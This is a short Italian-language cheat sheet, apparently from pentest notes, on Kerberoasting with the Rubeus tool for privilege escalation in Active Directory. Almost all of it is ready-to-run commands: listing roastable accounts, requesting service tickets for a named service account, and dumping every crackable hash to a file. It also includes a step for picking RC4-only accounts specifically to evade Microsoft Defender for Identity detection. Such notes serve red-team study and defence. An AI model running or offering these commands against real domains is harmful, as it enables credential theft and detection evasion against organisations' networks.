# Priv Esc - Kerberoasting - Rubeus

* Utilizzare Rubeus per listare le statistiche relative al Kerberoasting

```powershell
Rubeus.exe kerberoast /stats
```

* Utilizzare Rubeus per richiedere un Ticket Granted Service (TGS)

```powershell
Rubeus.exe kerberoast /user:svcadmin /simple
```

* Per evitare rilevamenti basati sul Downgrade della Crittografia per il Tipo di Crittografia (EType) di Kerberos (usato da strumenti come MDI - 0x17 sta per rc4-hmac), cerca account 'Kerberoastabili' che supportano solo RC4\_HMAC.

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

* Eseguire il kerberoast su tutti gli account che lo permettono&#x20;

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```
